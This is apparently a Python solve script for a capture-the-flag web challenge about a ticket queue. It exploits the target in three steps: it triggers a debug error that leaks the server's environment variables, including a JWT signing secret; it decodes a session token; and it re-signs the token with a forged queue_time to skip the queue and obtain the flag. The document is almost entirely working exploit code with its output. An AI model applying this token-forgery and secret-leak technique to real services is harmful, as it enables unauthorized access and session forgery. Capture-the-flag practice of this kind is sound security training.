import requests
import json
import jwt

url = "http://challenge.nahamcon.com:30341/check_queue"
resp = requests.post(url, data={"token": "0"})
print(json.dumps(resp.json(), indent=4))
# {
#     "error": "An unexpected error occurred",
#     "error_details": {
#         "debug_mode": false,
#         "environment": {
#             "GPG_KEY": "E3FF2839C048B25C084DEBE9B26995E310250568",
#             "HOME": "/root",
#             "HOSTNAME": "infinite-queue-b4c575a93a020933-7bfbb86b74-8b6x7",
#             "JWT_SECRET": "4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC",
#             "KUBERNETES_PORT": "tcp://34.118.224.1:443",
#             "KUBERNETES_PORT_443_TCP": "tcp://34.118.224.1:443",
#             "KUBERNETES_PORT_443_TCP_ADDR": "34.118.224.1",
#             "KUBERNETES_PORT_443_TCP_PORT": "443",
#             "KUBERNETES_PORT_443_TCP_PROTO": "tcp",
#             "KUBERNETES_SERVICE_HOST": "34.118.224.1",
#             "KUBERNETES_SERVICE_PORT": "443",
#             "KUBERNETES_SERVICE_PORT_HTTPS": "443",
#             "LANG": "C.UTF-8",
#             "PATH": "/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
#             "PYTHON_SHA256": "8c136d199d3637a1fce98a16adc809c1d83c922d02d41f3614b34f8b6e7d38ec",
#             "PYTHON_VERSION": "3.9.22",
#             "WERKZEUG_SERVER_FD": "3"
#         },
#         "error": "Not enough segments",
#         "request_data": {
#             "token": "0"
#         },
#         "time": "2025-05-23T20:23:35.969633"
#     }
# }


token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMUAxLmNvbSIsInF1ZXVlX3RpbWUiOjE3OTY3OTI2ODIuNDU0NTM1LCJleHAiOjUzNDgwMjc4NjJ9.8gMb-FDQfk0D4j1kTRnyCCE3sHuve8CVdAGZ7ydBc6o"
headers = jwt.get_unverified_header(token)
payload = jwt.decode(token, options={"verify_signature": False})
print(headers)
print(payload)
# {'alg': 'HS256', 'typ': 'JWT'}
# {'user_id': '1@1.com', 'queue_time': 1796792682.454535, 'exp': 5348027862}


payload["queue_time"] = 1.0
token_exp = jwt.encode(payload, key="4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC", algorithm="HS256", headers=headers)
print(token_exp)
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMUAxLmNvbSIsInF1ZXVlX3RpbWUiOjEuMCwiZXhwIjo1MzQ4MDI3ODYyfQ.SFSUdc0b6UIf7zJbDLMVJMUvudk6B2qgBvvbr0KDr3Y


resp = requests.post(url, data={"token": token_exp})
print(json.dumps(resp.json(), indent=4))
# {
#     "message": "Your turn has arrived! You can now purchase tickets.",
#     "status": "ready"
# }


# flag{b1bd4795215a7b81699487cc7e32d936}
